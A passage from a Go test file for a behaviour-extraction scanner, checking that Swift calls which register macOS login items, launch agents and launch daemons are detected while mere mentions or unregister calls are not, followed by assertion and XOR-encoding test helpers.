		{`try SMAppService.loginItem(identifier: "com.example.helper").register()`, "login-item.register", "login-item", "com.example.helper"},
		{`try SMAppService.mainApp.register()`, "login-item.register", "login-item", ""},
		{`try SMAppService.loginItem(identifier: helperID).register()`, "login-item.register", "login-item", ""},
		{`try SMAppService.agentService(plistName: "com.example.agent.plist").register()`, "launchd.job.register", "launch-agent", "com.example.agent.plist"},
		{`try SMAppService.daemonService(plistName: "com.example.daemon.plist").register()`, "launchd.job.register", "launch-daemon", "com.example.daemon.plist"},
	}
	for _, tt := range tests {
		t.Run(tt.line, func(t *testing.T) {
			var graph behavior.Graph
			content := artifact.Content{
				NodeID:      "node-0001",
				LogicalPath: "LoginItem.swift",
				Kind:        "script",
				MediaType:   "text/plain",
				Data:        []byte(tt.line),
			}

			ExtractText(&graph, content)

			assertOperation(t, graph, behavior.OperationKind(tt.kind), tt.category, tt.concrete)
		})
	}
}

func TestExtractTextNativeLoginItemMentionsAreNotOperations(t *testing.T) {
	tests := []string{
		`print("SMAppService")`,
		`print("SMLoginItemSetEnabled(\"com.example.helper\", true)")`,
		`print("SMAppService.loginItem(identifier: \"com.example.helper\").register()")`,
		`let service = SMAppService.loginItem(identifier: "com.example.helper")`,
		`try SMAppService.loginItem(identifier: "com.example.helper").unregister()`,
		`SMLoginItemSetEnabled("com.example.helper", false)`,
		`SMLoginItemSetEnabled("com.example.helper", shouldEnable)`,
		`let service = SMAppService.loginItem(identifier: "com.example.helper"); try other.register()`,
		`let service = SMAppService.mainApp; try other.register()`,
	}
	for _, line := range tests {
		t.Run(line, func(t *testing.T) {
			var graph behavior.Graph
			content := artifact.Content{
				NodeID:      "node-0001",
				LogicalPath: "LoginItem.swift",
				Kind:        "script",
				MediaType:   "text/plain",
				Data:        []byte(line),
			}

			ExtractText(&graph, content)

			assertNoOperationKind(t, graph, "login-item.register")
		})
	}
}

func assertShellCommandNetwork(t *testing.T, graph behavior.Graph, want string) {
	t.Helper()
	if hasNetworkOperationDestination(graph, want) {
		return
	}
	t.Fatalf("missing network destination %q: operations=%#v", want, graph.Operations)
}

func assertNetworkDestinationAbsent(t *testing.T, graph behavior.Graph, unwanted string) {
	t.Helper()
	if hasNetworkOperationDestination(graph, unwanted) {
		t.Fatalf("unexpected network destination %q: operations=%#v", unwanted, graph.Operations)
	}
}

func assertOperationKind(t *testing.T, graph behavior.Graph, want behavior.OperationKind) {
	t.Helper()
	for _, operation := range graph.Operations {
		if operation.Kind == want {
			return
		}
	}
	t.Fatalf("missing operation kind %q: %#v", want, graph.Operations)
}

func assertOperation(t *testing.T, graph behavior.Graph, kind behavior.OperationKind, category, concrete string) {
	t.Helper()
	for _, operation := range graph.Operations {
		if operation.Kind == kind && testOperationHasResource(operation, category, concrete) {
			return
		}
	}
	t.Fatalf("missing operation %s/%s/%s: %#v", kind, category, concrete, graph.Operations)
}

func assertNoOperationKind(t *testing.T, graph behavior.Graph, want behavior.OperationKind) {
	t.Helper()
	for _, operation := range graph.Operations {
		if operation.Kind == want {
			t.Fatalf("unexpected operation kind %q: %#v", want, graph.Operations)
		}
	}
}

func hasPythonDirectCallFeature(features []behavior.Feature, function string) bool {
	for _, feature := range features {
		if feature.Key == "script.function_call" && feature.Value == function {
			return true
		}
	}
	return false
}

func rustXOREncodedList(value string, key []byte) string {
	out := make([]byte, len(value))
	for i, b := range []byte(value) {
		out[i] = b ^ key[i%len(key)]
	}
	return byteList(out)
}

func byteList(values []byte) string {
	parts := make([]string, 0, len(values))
	for _, value := range values {
		parts = append(parts, strconv.Itoa(int(value)))
	}
	return strings.Join(parts, ",")
}
